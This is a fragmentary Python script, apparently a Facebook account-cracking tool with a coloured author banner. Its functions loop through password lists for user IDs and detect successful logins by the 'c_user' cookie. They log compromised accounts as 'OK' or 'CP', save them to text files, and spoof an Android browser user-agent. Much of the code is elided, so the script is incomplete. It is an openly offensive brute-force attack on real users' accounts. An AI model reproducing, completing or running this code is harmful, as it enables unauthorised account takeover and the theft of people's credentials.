...
\33[37;41m\t WELLCOME TO ibrahim X SAMI TOOL\33[0;m

\033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
\033[1;93m▇▇➣    \033[1;91mAUTHOR   : ibrahim X SAMI    \033[1;93m
\033[1;93m▇▇➣    \033[1;94mGITHUB   : ibrahim-KHAN-404     \033[1;93m     
\033[1;93m▇▇➣    \033[1;93mFACEBOOK : ibrahim KHAN    \033[1;93m    
...
def random_number():
	...
	print('[?] IDS SAVED IN ibrahim OK.txt,cp.txt')
	...
	try:
		...
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				print('\r\033[1;32m[ibrahim-OK] '+uid+' | '+ps)
				...
				print('\r\033[1;31m[ibrahim-CP] '+uid+' | '+ps)
		...
		sys.stdout.write(f"\r\x1b[1;32m[ ibrahim ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}] ")
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 11.0; BZT-AL00 Build/HUAWEIBZT-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.22 Safari/537.36;]',}
			...
			if 'c_user' in log_cookies:
				...
				print('\r\033[1;32m[ibrahim-FIRE🥰] '+uid+' | '+ps)
		...
		sys.stdout.write('\r\33[1;37m[OP-ibrahim] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
